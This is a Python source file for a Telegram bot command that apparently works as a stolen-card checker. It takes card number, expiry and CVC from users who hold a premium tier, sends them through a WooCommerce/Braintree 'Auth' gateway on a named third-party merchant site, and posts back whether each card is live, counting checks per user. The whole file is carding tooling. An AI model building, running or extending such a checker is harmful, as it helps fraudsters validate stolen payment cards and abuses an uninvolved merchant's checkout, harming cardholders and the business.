from pyrogram import filters
from pyromod import Client
from pyrogram.types import Message
from utilsdf.db import Database
from utilsdf.functions import (
    get_bin_info,
    get_cc,
    antispam,
    get_text_from_pyrogram,
    user_not_premium,
)
from utilsdf.woocomerce_funcs import b3_wc
from utilsdf.vars import PREFIXES
from time import perf_counter


@Client.on_message(filters.command("ps", PREFIXES))
async def ps(client: Client, m: Message):
    user_id = m.from_user.id
    with Database() as db:
        if not db.is_premium(user_id):
            await user_not_premium(m)
            return
        user_info = db.get_info_user(user_id)
    text = get_text_from_pyrogram(m)
    ccs = get_cc(text)
    if not ccs:
        return await m.reply(
            "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝙋𝙪𝙨𝙨𝙮<code> ♻️ -» Auth</code>\n𝙁𝙤𝙧𝙢𝙖𝙩 -» <code>/ps cc|month|year|cvc</code>",
            quote=True,
        )
    ini = perf_counter()
    cc = ccs[0]
    mes = ccs[1]
    ano = ccs[2]
    cvv = ccs[3]



    # check antispam
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩... -» <code>{antispam_result}'s</code>", quote=True
        )
    msg_to_edit = await m.reply("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...", quote=True)
    cc_formatted = f"{cc}|{mes}|{ano}|{cvv}"

    status, result = await b3_wc(cc, mes, ano, cvv, "podolskacoaching.com")

    final = perf_counter() - ini
    with Database() as db:
        db.increase_checks(user_id)

    text_ = f"""<b>ア 𝘾𝘾 -» <code>{cc_formatted}</code>
カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» <code>{status}</code>
ツ 𝙍𝙚𝙨𝙪𝙡𝙩 -» <code>{result}</code>

キ 𝘽𝙞𝙣 -» <code></code> - <code></code> - <code></code>
朱 𝘽𝙖𝙣𝙠 -» <code></code>
零 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» <code></code> 

⸙ 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» <code>𝙋𝙪𝙨𝙨𝙮 -» Auth</code>
꫟ 𝙏𝙞𝙢𝙚 -» <code>{final:0.3}'s</code>
ᥫ᭡ 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={m.from_user.id}'>{m.from_user.first_name}</a> [S]</b>"""

    await msg_to_edit.edit(text_)
